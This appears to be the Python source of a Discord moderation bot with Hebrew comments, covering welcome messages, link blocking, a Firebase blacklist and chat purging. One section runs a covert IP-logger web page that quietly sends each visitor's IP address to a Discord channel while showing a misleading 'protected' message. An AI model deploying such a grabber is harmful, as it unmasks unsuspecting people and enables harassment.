import discord
from discord.ext import commands
from discord import app_commands
import os, datetime, httpx, json
from flask import Flask, request
from threading import Thread

# --- 1. הגדרות (כאן אתה משנה את הלינק והערוצים) ---
FIREBASE_URL = "https://vouge-guard-default-rtdb.firebaseio.com/"
LOG_CHANNEL_ID = 1499510962296721568  # ערוץ לוגים ו-IP
WELCOME_CHANNEL_ID = 1499510962296721568 # ערוץ ברוך הבא

# --- 2. שרת ה-IP Logger (הדף שתופס כתובות) ---
app = Flask('')
@app.route('/')
def home():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    if bot.is_ready():
        channel = bot.get_channel(LOG_CHANNEL_ID)
        if channel:
            embed = discord.Embed(title="🌐 Cyber-Shield: נתפסה כתובת IP", color=discord.Color.red(), timestamp=datetime.datetime.now())
            embed.add_field(name="📍 כתובת", value=f"`{user_ip}`", inline=False)
            bot.loop.create_task(channel.send(embed=embed))
    return "<h1>Server Protected by Cyber-Shield</h1>"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- 3. תקשורת עם ה-Firebase (המוח של הבוט) ---
async def fb_get(path):
    async with httpx.AsyncClient() as client:
        res = await client.get(f"{FIREBASE_URL}{path}.json")
        return res.json()

async def fb_put(path, data):
    async with httpx.AsyncClient() as client:
        await client.put(f"{FIREBASE_URL}{path}.json", json=data)

# --- 4. הגדרת הבוט ---
class CyberShield(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)
    
    async def setup_hook(self):
        await self.tree.sync() # מסנכרן את הפקודות (סלאש)
        print(f"✅ Cyber-Shield מחובר ל-Firebase ובאוויר!")

bot = CyberShield()

# --- 5. אירועים: ברוך הבא ועזיבה (כמו ששלחת בתמונה) ---
@bot.event
async def on_member_join(member):
    channel = bot.get_channel(WELCOME_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title=f"⚡ הצטרף לשרת _ {member.name}",
            description=f"מספר **{len(member.guild.members)}** שהצטרף אלינו.\n\nתתחיל מ- <#כללי-שימוש>,\nתבחר תפקיד ב- <#בחירת-תפקידים>,\nותגיד שלום ב- <#הצגות>.",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Cyber-Shield Security")
        await channel.send(content=f"{member.mention}", embed=embed)

@bot.event
async def on_member_remove(member):
    channel = bot.get_channel(WELCOME_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title=f"😢 {member.name} עזב את השרת",
            description=f"נשארנו **{len(member.guild.members)}** חברים.",
            color=discord.Color.red()
        )
        await channel.send(embed=embed)

# --- 6. הגנה על השרת (Anti-Link & Blacklist) ---
@bot.event
async def on_message(message):
    if message.author.bot: return

    # בדיקה אם המשתמש חסום ב-Firebase
    blacklist = await fb_get("blacklist") or []
    if str(message.author.id) in blacklist:
        await message.delete()
        return

    # מחיקת קישורים למשתמשים שאינם מנהלים
    if "http" in message.content.lower() and not message.author.guild_permissions.administrator:
        await message.delete()
        await message.channel.send(f"⚠️ {message.author.mention}, הקישור נחסם על ידי **Cyber-Shield**!", delete_after=3)
    
    await bot.process_commands(message)

# --- 7. פקודות ניהול (Slash Commands) ---
@bot.tree.command(name="blacklist_add", description="חסימה קבועה ב-Firebase")
@app_commands.checks.has_permissions(administrator=True)
async def bl_add(interaction: discord.Interaction, member: discord.Member):
    current = await fb_get("blacklist") or []
    if str(member.id) not in current:
        current.append(str(member.id))
        await fb_put("blacklist", current)
        await interaction.response.send_message(f"🚫 {member.mention} נוסף לרשימה השחורה של Cyber-Shield.")
    else:
        await interaction.response.send_message("הוא כבר חסום.")

@bot.tree.command(name="clear", description="ניקוי צ'אט")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🧹 ניקיתי `{len(deleted)}` הודעות.", ephemeral=True)

# --- 8. הפעלה ---
if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.run("YOUR_TOKEN_HERE") # שים כאן את הטוקן שלך
